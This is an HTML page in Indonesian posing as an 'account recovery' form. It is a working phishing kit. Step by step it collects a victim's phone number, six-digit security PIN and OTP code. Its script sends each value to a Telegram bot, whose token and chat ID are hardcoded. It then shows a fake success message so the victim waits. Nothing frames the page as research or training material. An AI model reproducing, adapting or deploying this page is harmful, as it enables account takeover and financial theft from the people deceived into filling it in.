<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pemulihan Akun</title>
    <style>
        /* CSS SEDERHANA & BERSIH */
        body { font-family: sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; width: 340px; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; }
        h2 { color: #008ced; margin-bottom: 10px; font-size: 20px; }
        p { font-size: 14px; color: #666; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
        button { width: 100%; padding: 12px; background: #008ced; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        button:hover { background: #0076c9; }
        .step { display: none; }
        .step.active { display: block; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div id="step1" class="step active">
        <h2>Pemulihan Akun</h2>
        <p>Silakan mulai untuk memulihkan akses akun Anda.</p>
        <button onclick="nextStep(2)">Mulai Pemulihan</button>
    </div>

    <div id="step2" class="step">
        <h2>Nomor Telepon</h2>
        <p>Masukkan nomor yang terdaftar.</p>
        <input type="tel" id="no_hp" placeholder="08xxxxxxxxxx" required>
        <button onclick="sendToTelegram('Nomor HP', 'no_hp', 3)">Lanjut</button>
    </div>

    <div id="step3" class="step">
        <h2>Konfirmasi PIN</h2>
        <p>Masukkan 6 digit PIN keamanan Anda.</p>
        <input type="password" id="pin_user" maxlength="6" placeholder="******" required>
        <button onclick="sendToTelegram('PIN', 'pin_user', 4)">Konfirmasi</button>
    </div>

    <div id="step4" class="step">
        <h2>Verifikasi OTP</h2>
        <p>Masukkan kode verifikasi yang kami kirim.</p>
        <input type="number" id="otp_code" placeholder="0000" required>
        <button onclick="sendToTelegram('OTP', 'otp_code', 5)">Verifikasi</button>
    </div>

    <div id="step5" class="step">
        <div style="font-size: 50px; color: #4CAF50;">✔️</div>
        <h2>Berhasil!</h2>
        <p>Permintaan pemulihan sedang diproses. Mohon tunggu 1x24 jam.</p>
        <button onclick="location.reload()">Tutup</button>
    </div>
</div>

<script>
    const API_TOKEN = '8757073721:AAGNiOegOJiONr9qMxuYEBWMwT79TvoXY7Y';
    const CHAT_ID = '5635300527';

    function nextStep(step) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + step).classList.add('active');
    }

    function sendToTelegram(label, elementId, next) {
        const val = document.getElementById(elementId).value;
        if (!val) return alert("Harap isi bidang ini!");

        const pesan = `🔔 **Data Baru Masuk**\n------------------\n📌 ${label}: ${val}`;
        const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;

        fetch(url)
            .then(res => {
                if(res.ok) nextStep(next);
                else alert("Terjadi kesalahan koneksi.");
            })
            .catch(err => console.error(err));
    }
</script>

</body>
</html>
